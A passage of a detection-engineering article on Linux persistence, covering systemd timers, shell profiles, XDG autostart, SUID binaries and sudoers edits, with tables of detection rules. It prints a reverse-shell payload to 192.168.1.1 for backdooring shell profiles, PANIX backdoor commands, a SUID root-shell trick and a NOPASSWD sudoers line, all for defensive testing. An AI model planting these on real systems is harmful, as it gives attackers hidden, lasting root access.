run the \",(0,i.jsx)(e.code,{children:\"ExecStart\"}),\" section of the service unit (which initiates the outbound network connection) every time the timer hits. To detect potential systemd persistence, we leverage the following behavioral rules:\"]}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Category\"}),(0,i.jsx)(e.th,{children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"File\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_systemd_service_creation.toml\",rel:\"nofollow\",children:\"Systemd Service Created\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_systemd_scheduled_timer_created.toml\",rel:\"nofollow\",children:\"Systemd Timer Created\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_systemd_generator_creation.toml\",rel:\"nofollow\",children:\"Systemd Generator Created\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_etc_file_creation.toml\",rel:\"nofollow\",children:\"Suspicious File Creation in /etc for Persistence\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"Process\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_systemd_service_started.toml\",rel:\"nofollow\",children:\"Systemd Service Started by Unusual Parent Process\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_hidden_payload_executed_via_scheduled_job.toml\",rel:\"nofollow\",children:\"Hidden Payload Executed via Scheduled Job\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_job_executing_binary_in_unusual_location.toml\",rel:\"nofollow\",children:\"Scheduled Job Executing Binary in Unusual Location\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_task_unusual_command_execution.toml\",rel:\"nofollow\",children:\"Scheduled Task Unusual Command Execution\"})})]})]})]})}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-for-t1053t1453---systemd-services-timers-and-generators\",children:\"Hunting for T1053/T1453 - systemd services, timers and generators\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"We can hunt for uncommon \",(0,i.jsx)(e.code,{children:\"service\"}),\"/\",(0,i.jsx)(e.code,{children:\"timer\"}),\"/\",(0,i.jsx)(e.code,{children:\"generator\"}),\" file creations in our environment through systemd by leveraging ES|QL and OSQuery. The \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_systemd_timers.toml\",rel:\"nofollow\",children:\"Persistence via Systemd (Timers)\"}),\" file contains several ES|QL and OSQuery queries that can help hunt for these types of persistence.\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"t1546004---event-triggered-execution-unix-shell-configuration-modification\",children:\"T1546.004 - event triggered execution: Unix shell configuration modification\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://effective-shell.com/part-5-building-your-toolkit/configuring-the-shell/\",rel:\"nofollow\",children:\"Unix shell configuration files\"}),\" are scripts that run throughout a user session based on events (e.g., log in/out, or open/close a shell session). These files are used to customize the shell environment, including setting environment variables, aliases, and other session-specific settings. As these files are executed via a shell, they can easily be leveraged by attackers to establish persistence on a system by injecting backdoors into these scripts.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Different shells have their own configuration files. Similarly to cron and systemd, this persistence mechanism can be established with both user and root privileges. Depending on the shell, system-wide shell configuration files are located in the following locations and require root permissions to be changed:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/profile\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/profile.d/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/bash.bashrc\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/bash.bash_logout\"})}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"User-specific shell configuration files are triggered through actions performed by and executed in the user's context. Depending on the shell, these typically include:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.profile\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.bash_profile\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.bash_login\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.bash_logout\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.bashrc\"})}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Once modified, these scripts ensure malicious commands are executed for every user login or logout. These scripts are executed in a \",(0,i.jsx)(e.a,{href:\"https://www.thegeekstuff.com/2008/10/execution-sequence-for-bash_profile-bashrc-bash_login-profile-and-bash_logout/\",rel:\"nofollow\",children:\"specific order\"}),\". When a user logs in via SSH, the order of execution for the login shells is:\"]}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/profile\"})}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"~/.bash_profile\"}),\" (if it exists, otherwise)\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"~/.bash_login\"}),\" (if it exists, otherwise)\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"~/.profile\"}),\" (if it exists)\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"For non-login interactive shell initialization, \",(0,i.jsx)(e.code,{children:\"~/.bashrc\"}),\" is executed. Typically, to ensure this configuration file is also executed on login, \",(0,i.jsx)(e.code,{children:\"~/.bashrc\"}),\" is sourced within \",(0,i.jsx)(e.code,{children:\"~/.bash_profile\"}),\", \",(0,i.jsx)(e.code,{children:\"~/.bash_login\"}),\" or \",(0,i.jsx)(e.code,{children:\"~/.profile\"}),\". Additionally, a backdoor can be added to the \",(0,i.jsx)(e.code,{children:\"~/.bash_logout\"}),\" configuration file for persistence upon shell termination.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"When planting a backdoor in one of these files, it is important not to make mistakes in the execution chain, meaning that it is both important to pick the correct configuration file and to pick a fitting payload. A typical reverse shell connection will make the terminal freeze while sending the reverse shell connection to the background will make it malfunction. A potential payload could look like this:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`(nohup bash -i \u003e /dev/tcp/192.168.1.1/1337 0\u003c\u00261 2\u003e\u00261 \u0026)\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"This command uses \\u201Cnohup\\u201D (no hang up) to run an interactive bash reverse shell as a background process, ensuring it continues running even after the initiating user logs out. The entire command is then executed in the background using \",(0,i.jsx)(e.code,{children:\"\u0026\"}),\" and wrapped in parentheses to create a subshell, preventing any interference with the parent shell\\u2019s operations.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Be vigilant for other types of backdoors, such as credential stealers that create fake \\u201C\",(0,i.jsx)(e.code,{children:\"[sudo] password for\\u2026\"}),\"\\u201D prompts when running sudo or the execution of malicious binaries. MITRE specifies more information and real-world examples related to this technique in \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1546/004/\",rel:\"nofollow\",children:\"T1546.004\"}),\".\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"persistence-through-t1546004---shell-profile-modification\",children:\"Persistence through T1546.004 - shell profile modification\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"You can add a bash payload to shell configuration files either manually or using PANIX. When PANIX runs with user privileges, it establishes persistence by modifying \",(0,i.jsx)(e.code,{children:\"~/.bash_profile\"}),\". With root privileges, it modifies the \",(0,i.jsx)(e.code,{children:\"/etc/profile\"}),\" file to achieve system-wide persistence.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`sudo ./panix.sh --shell-profile --default --ip 192.168.1.1 --port 2004\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"To trigger it, either log in as root via the shell with \",(0,i.jsx)(e.code,{children:\"su --login root\"}),\" or login via SSH. The shell profile will be parsed and executed in order, resulting in the following chain of execution:\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/primer-on-persistence-mechanisms/image10.png\",alt:\"Events generated as a result of shell profile modification persistence establishment\",title:\"Events generated as a result of shell profile modification persistence establishment\",width:\"1440\",height:\"561\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"PANIX plants the backdoor in \",(0,i.jsx)(e.code,{children:\"/etc/profile\"}),\", next \",(0,i.jsx)(e.code,{children:\"su --login root\"}),\" is executed to trigger the payload, the \",(0,i.jsx)(e.code,{children:\"UID\"}),\"/\",(0,i.jsx)(e.code,{children:\"GID\"}),\" changes to root, and a network connection is initiated through the injected backdoor. A similar process occurs when logging in via SSH. We can detect several steps of the attack chain.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Detection and endpoint rules that cover shell profile modification persistence_\"}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Category\"}),(0,i.jsx)(e.th,{children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"File\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_shell_configuration_modification.toml\",rel:\"nofollow\",children:\"Shell Configuration Creation or Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"Process\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_binary_execution_from_unusual_location_through_shell_profile.toml\",rel:\"nofollow\",children:\"Binary Execution from Unusual Location through Shell Profile\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"Network\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_network_connection_through_shell_profile.toml\",rel:\"nofollow\",children:\"Network Connection through Shell Profile\"})})]})]})]})}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-for-t1546004---shell-configuration-modification\",children:\"Hunting for T1546.004 - shell configuration modification\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"We can hunt for shell profile file creations/modification, as well as SSHD child processes, by leveraging ES|QL and OSQuery. The \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_shell_modification_persistence.toml\",rel:\"nofollow\",children:\"Shell Modification Persistence\"}),\" hunting rule contains several of these hunting queries.\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"t1547013---boot-or-logon-autostart-execution-xdg-autostart-entries\",children:\"T1547.013 - boot or logon autostart execution: XDG autostart entries\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Cross-Desktop Group (XDG) is a set of\",(0,i.jsx)(e.a,{href:\"https://specifications.freedesktop.org/autostart-spec/autostart-spec-latest.html\",rel:\"nofollow\",children:\" standards for Unix desktop environments\"}),\" that describe how applications should be started automatically when a user logs in. The XDG Autostart specification is particularly interesting, as it defines a way to automatically launch applications based on desktop entry files, which are plain text files with the \",(0,i.jsx)(e.code,{children:\".desktop\"}),\" extension.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"The \",(0,i.jsx)(e.code,{children:\".desktop\"}),\" files are typically used to configure how applications appear in menus and how they are launched. By leveraging XDG Autostart, attackers can configure malicious applications to run automatically whenever users log into their desktop environment.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"The location where these files can be placed varies based on whether the persistence is being established for all users (system-wide) or a specific user. It also depends on the desktop environment used; for example, KDE has other configuration locations than Gnome. Default system-wide autostart files are located in directories that require root permissions to modify, such as:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/xdg/autostart/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/share/autostart/\"})}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"Default user-specific autostart files, other than the root user-specific autostart file, only require user-level permissions. These are typically located in:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.config/autostart/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.local/share/autostart/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.config/autostart-scripts/ (not part of XDG standard, but used by KDE)\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/root/.config/autostart/*\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/root/.local/share/autostart/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/root/.config/autostart-scripts/\"})}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"An example of a \",(0,i.jsx)(e.code,{children:\".desktop\"}),\" file that executes a binary whenever a user logs in looks like this:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`[Desktop Entry]\nType=Application\nExec=/path/to/malicious/binary\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=Updater\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Volexity recently published research on \",(0,i.jsx)(e.a,{href:\"https://www.volexity.com/blog/2024/06/13/disgomoji-malware-used-to-target-indian-government/\",rel:\"nofollow\",children:\"DISGOMOJI\"}),\" malware, which was found to establish persistence by dropping a \",(0,i.jsx)(e.code,{children:\".desktop\"}),\" file in the \",(0,i.jsx)(e.code,{children:\"~/.config/autostart/\"}),\" directory, which would execute a malicious backdoor planted on the system. As it can be established with both user/root privileges, it is an interesting candidate for automated persistence implementations. Additionally, more information and real-world examples related to this technique are specified by MITRE in \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1547/013/\",rel:\"nofollow\",children:\"T1547.013\"}),\".\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"persistence-through-t1547013---cross-desktop-group-xdg\",children:\"Persistence through T1547.013 - Cross-Desktop Group (XDG)\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"You can determine coverage and dynamically analyze this technique manually or through PANIX. When analyzing this technique, make sure XDG is available on your testing system, as it is designed to be used on systems with a GUI (XDG can also be used without a GUI). When PANIX runs with user privileges, it establishes persistence by modifying \",(0,i.jsx)(e.code,{children:\"~/.config/autostart/user-dirs.desktop\"}),\" to execute \",(0,i.jsx)(e.code,{children:\"~/.config/autostart/.user-dirs\"}),\" and achieve user-specific persistence. With root privileges, it modifies \",(0,i.jsx)(e.code,{children:\"/etc/xdg/autostart/pkc12-register.desktop\"}),\" to execute \",(0,i.jsx)(e.code,{children:\"/etc/xdg/pkc12-register\"}),\" and achieve system-wide persistence.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`sudo ./panix.sh --xdg --default --ip 192.168.1.1 --port 2005\n[+] XDG persistence established.\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"After rebooting the system and collecting the logs, the following events will be present for a GNOME-based system.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/primer-on-persistence-mechanisms/image7.png\",alt:\"Events generated as a result of XDG persistence establishment\",title:\"Events generated as a result of XDG persistence establishment\",width:\"1440\",height:\"637\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"We can see PANIX creating the \",(0,i.jsx)(e.code,{children:\"/etc/xdg/autostart\"}),\" directory and the \",(0,i.jsx)(e.code,{children:\"pkc12-register/pkc12-register.desktop\"}),\" files. It grants execution privileges to the backdoor script, after which persistence is established. When the user logs in, the \",(0,i.jsx)(e.code,{children:\".desktop\"}),\" files are parsed, and \",(0,i.jsx)(e.code,{children:\"/usr/libexec/gnome-session-binary\"}),\" executes its contents, which in turn initiates the reverse shell connection. Here, again, we can detect several parts of the attack chain.\"]}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Category\"}),(0,i.jsx)(e.th,{children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"File\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_kde_autostart_modification.toml\",rel:\"nofollow\",children:\"Persistence via KDE AutoStart Script or Desktop File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"Network\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_xdg_autostart_netcon.toml\",rel:\"nofollow\",children:\"Network Connections Initiated Through XDG Autostart Entry\"})})]})]})]})}),`\n`,(0,i.jsx)(e.p,{children:\"Again, the file category has two different rules: the former focuses on creation/modification using Elastic Defend, while the latter focuses on modification through FIM.\"}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-for-t1547013---xdg-autostart-entries\",children:\"Hunting for T1547.013 - XDG autostart entries\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Hunting for persistence through XDG involves XDG \",(0,i.jsx)(e.code,{children:\".desktop\"}),\" file creations in known locations and unusual child processes spawned from a session-manager parent through ES|QL and OSQuery. The \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_xdg_autostart_modifications.toml\",rel:\"nofollow\",children:\"XDG Persistence\"}),\" hunting rule contains several queries to hunt for XDG persistence.\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"t1548001---abuse-elevation-control-mechanism-setuid-and-setgid\",children:\"T1548.001 - abuse elevation control mechanism: setuid and setgid\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man2/setuid.2.html\",rel:\"nofollow\",children:\"Set Owner User ID (SUID)\"}),\" and \",(0,i.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man2/setgid.2.html\",rel:\"nofollow\",children:\"Set Group ID (SGID)\"}),\" are Unix file permissions allowing users to run executables with the executable\\u2019s owner or group permissions, respectively. When the SUID bit is set on an executable owned by the root user, any user running the executable gains root privileges. Similarly, when the SGID bit is set on an executable, it runs with the permissions of the group that owns the file.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Typical targets for SUID and SGID backdoors include common system binaries like \",(0,i.jsx)(e.code,{children:\"find\"}),\", \",(0,i.jsx)(e.code,{children:\"vim\"}),\", or \",(0,i.jsx)(e.code,{children:\"bash\"}),\", frequently available and widely used. \",(0,i.jsx)(e.a,{href:\"https://gtfobins.github.io/#+suid\",rel:\"nofollow\",children:\"GTFOBins\"}),\" provides a list of common Unix binaries that can be exploited to obtain a root shell or unauthorized file reads. System administrators must be cautious when managing SUID and SGID binaries, as improperly configured permissions can lead to significant security vulnerabilities.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"To exploit this, either a misconfigured SUID or SGID binary must be present on the system, or root-level privileges must be obtained to create a backdoor. Typical privilege escalation enumeration scripts enumerate the entire filesystem for the presence of these binaries using \",(0,i.jsx)(e.code,{children:\"find\"}),\".\"]}),`\n`,(0,i.jsx)(e.p,{children:\"SUID and SGID binaries are common on Linux and are available on the system by default. Generally, these cannot be exploited. An example of a misconfigured SUID binary looks like this:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`find / -perm -4000 -type f -exec ls -la {} \\\\;\n-rwsr-sr-x 1 root root 1396520 Mar 14 11:31 /bin/bash\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The \",(0,i.jsx)(e.code,{children:\"/bin/bash\"}),\" binary is not a default SUID binary and causes a security risk. An attacker could now run \",(0,i.jsx)(e.code,{children:\"/bin/bash -p\"}),\" to run bash and keep the root privileges on execution. More information on this is available at \",(0,i.jsx)(e.a,{href:\"https://gtfobins.github.io/gtfobins/bash/\",rel:\"nofollow\",children:\"GTFOBins\"}),\". Although MITRE defines this as privilege escalation/defense evasion, it can (as shown) be used for persistence as well. More information by MITRE on this technique is available at \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1548/001/\",rel:\"nofollow\",children:\"T1548.001\"}),\".\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"persistence-through-t1548001---setuid-and-setgid\",children:\"Persistence through T1548.001 - setuid and setgid\"}),`\n`,(0,i.jsx)(e.p,{children:\"This method requires root privileges, as it sets the SUID bit to a set of executables:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`sudo ./panix.sh --suid --default\n[+] SUID privilege granted to /usr/bin/find\n[+] SUID privilege granted to /usr/bin/dash\n[-] python is not present on the system.\n[+] SUID privilege granted to /usr/bin/python3                                                                                       \n`})}),`\n`,(0,i.jsx)(e.p,{children:\"After setting SUID permissions to the binary, it can be executed in a manner that will allow the user to keep the root privileges:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\n/usr/bin/find . -exec /bin/sh -p \\\\; -quit\nwhoami\nroot\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Looking at the events this generates, we can see a discrepancy between the user ID and real user ID:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/primer-on-persistence-mechanisms/image8.png\",alt:\"Events generated as a result of SUID/SGID persistence establishment\",title:\"Events generated as a result of SUID/SGID persistence establishment\",width:\"1440\",height:\"495\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"After executing PANIX with \",(0,i.jsx)(e.code,{children:\"sudo\"}),\", SUID permissions were granted to \",(0,i.jsx)(e.code,{children:\"/usr/bin/find\"}),\", \",(0,i.jsx)(e.code,{children:\"/usr/bin/dash\"}),\", and \",(0,i.jsx)(e.code,{children:\"/usr/bin/python3\"}),\" using \",(0,i.jsx)(e.code,{children:\"chmod\"}),\". Subsequently, \",(0,i.jsx)(e.code,{children:\"/usr/bin/find\"}),\" was utilized to run \",(0,i.jsx)(e.code,{children:\"/bin/sh\"}),\" with privileged mode (\",(0,i.jsx)(e.code,{children:\"-p\"}),\") to obtain a root shell. Typically, the real user ID of a process matches the effective user ID. However, there are exceptions, such as when using \",(0,i.jsx)(e.code,{children:\"sudo\"}),\", \",(0,i.jsx)(e.code,{children:\"su\"}),\", or, as demonstrated here, a SUID binary, where the real user ID differs. Using our knowledge of GTFOBins and the execution chain, we can detect several indicators of SUID and SGID abuse.\"]}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Category\"}),(0,i.jsx)(e.th,{children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"Process\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_suid_sguid_enumeration.toml\",rel:\"nofollow\",children:\"SUID/SGUID Enumeration Detected\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/privilege_escalation_potential_suid_sgid_exploitation.toml\",rel:\"nofollow\",children:\"Setuid / Setgid Bit Set via chmod\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/privilege_escalation_setuid_setgid_bit_set_via_chmod.toml\",rel:\"nofollow\",children:\"Privilege Escalation via SUID/SGID\"})})]})]})]})}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-for-t1548001---setuid-and-setgid\",children:\"Hunting for T1548.001 - setuid and setgid\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The simplest and most effective way of hunting for SUID and SGID files is to search the filesystem for these files through OSQuery and take note of unusual ones. The \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/privilege_escalation_via_suid_binaries.toml\",rel:\"nofollow\",children:\"OSQuery SUID Hunting\"}),\" rule can help you to hunt for this technique.\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"t1548003---abuse-elevation-control-mechanism-sudo-and-sudo-caching-sudoers-file-modification\",children:\"T1548.003 - abuse elevation control mechanism: sudo and sudo caching (sudoers file modification)\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The \",(0,i.jsx)(e.code,{children:\"sudo\"}),\" command allows users to execute commands with superuser or other user privileges. The sudoers file manages \",(0,i.jsx)(e.a,{href:\"https://linux.die.net/man/5/sudoers\",rel:\"nofollow\",children:\"sudo permissions\"}),\", which dictates who can use sudo and what commands they can run. The main configuration file is located at \",(0,i.jsx)(e.code,{children:\"/etc/sudoers\"}),\".\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"This file contains global settings and user-specific rules for sudo access. Additionally, there is a directory used to store additional sudoers configuration files at \",(0,i.jsx)(e.code,{children:\"/etc/sudoers.d/\"}),\". Each file in this directory is treated as an extension of the main sudoers file, allowing for modular and organized sudo configurations.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Both system administrators and threat actors can misconfigure the sudoers file and its extensions. A common accidental misconfiguration might be overly permissive rules that grant users more access than necessary. Conversely, a threat actor with root access can deliberately modify these files to ensure they maintain elevated access.\"}),`\n`,(0,i.jsx)(e.p,{children:\"An example of a misconfiguration or backdoor that allows an attacker to run any command as any user without a password prompt looks like this:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`Attacker ALL=(ALL) NOPASSWD:ALL\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"By exploiting such misconfigurations, an attacker can maintain persistent root access. For example, with the above backdoored configuration, the attacker can gain a root shell by executing \",(0,i.jsx)(e.code,{children:\"sudo /bin/bash\"}),\". Similarly to the previous technique, this technique is also classified as privilege escalation/defense evasion by MITRE. Of course, this is again true, but it is also a way of establishing persistence. More information on T1548.003 can be found \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1548/003/\",rel:\"nofollow\",children:\"here\"}),\".\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"persistence-through-t1548003---sudoers-file-modification\",children:\"Persistence through T1548.003 - sudoers file modification\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The \",(0,i.jsx)(e.code,{children:\"sudo -l\"}),\" command can be used to list out the allowed (and forbidden) commands for the user on the current host. By default, a non-root user cannot run any commands using sudo without specifying a password.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`sudo -l\n[sudo] password for attacker:\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Let\\u2019s add a backdoor entry for the \",(0,i.jsx)(e.code,{children:\"attacker\"}),\" 